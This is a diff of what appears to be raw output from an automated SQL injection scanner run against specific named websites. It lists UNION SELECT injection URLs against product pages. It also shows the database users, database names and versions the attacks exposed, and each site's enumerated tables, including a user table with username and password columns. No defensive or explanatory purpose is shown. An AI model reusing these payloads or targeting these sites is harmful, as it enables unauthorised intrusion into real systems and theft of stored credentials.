@@ -1,28 +1,5 @@
 [-] Found column number: 9
 [-] Null Number: 1
-[-] URL: http://www.wisithailand.com/product-detail.php?id=1+AND+1=2+UNION+ALL+SELECT+0,darkc0de,2,3,4,5,6,7,8,9+--
-[-] User: wisithai_admin@localhost
-[-] Database: wisithai_db
-[-] Version: 5.7.32
-[1] (about) : id, subject, subject2, description, content, path, id, subject, subject2, description, content, path, 
-[2] (category) : id, category, type, position, id, category, type, position, 
-[3] (contact) : id, company, address, telephone, fax, email, g_map, id, company, address, telephone, fax, email, g_map, 
-[4] (news) : id, subject, description, content, path, date, id, subject, description, content, path, date, 
-[5] (product) : id, subject, description, model, content, path, date, homepage, category, file, id, subject, description, model, content, path, date, homepage, category, file, 
-[6] (slide) : id, path, text1, text2, date, id, path, text1, text2, date, 
-[7] (user) : id, username, password, date, grant, id, username, password, date, grant, 
-[8] (about) : id, subject, subject2, description, content, path, id, subject, subject2, description, content, path, 
-[9] (category) : id, category, type, position, id, category, type, position, 
-[10] (contact) : id, company, address, telephone, fax, email, g_map, id, company, address, telephone, fax, email, g_map, 
-[11] (news) : id, subject, description, content, path, date, id, subject, description, content, path, date, 
-[12] (product) : id, subject, description, model, content, path, date, homepage, category, file, id, subject, description, model, content, path, date, homepage, category, file, 
-[13] (slide) : id, path, text1, text2, date, id, path, text1, text2, date, 
-[14] (user) : id, username, password, date, grant, id, username, password, date, grant, 
-[-] Found column number: 0
-[-] Null Number: 
-[-] URL: http://www.wisithailand.com/product-detail.php?id=1+AND+1=2+UNION+ALL+SELECT+0+--
-[-] Found column number: 9
-[-] Null Number: 1
 [-] URL: http://www.wisithailand.com/product-detail.php?id=1+AND+1=2+UNION+ALL+SELECT+0,lilyrisa,2,3,4,5,6,7,8,9+--
 [-] User: wisithai_admin@localhost
 [-] Database: wisithai_db
@@ -41,3 +18,9 @@
 [12] (product) : id, subject, description, model, content, path, date, homepage, category, file, id, subject, description, model, content, path, date, homepage, category, file, 
 [13] (slide) : id, path, text1, text2, date, id, path, text1, text2, date, 
 [14] (user) : id, username, password, date, grant, id, username, password, date, grant, 
+[-] Found column number: 18
+[-] Null Number: 1
+[-] URL: https://www.molbiodiagnostics.com/product_details.php?id=1+AND+1=2+UNION+ALL+SELECT+0,lilyrisa,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+--
+[-] User: molbil7_onemolb@localhost
+[-] Database: molbil7_molbio1
+[-] Version: 10.1.46-MariaDB
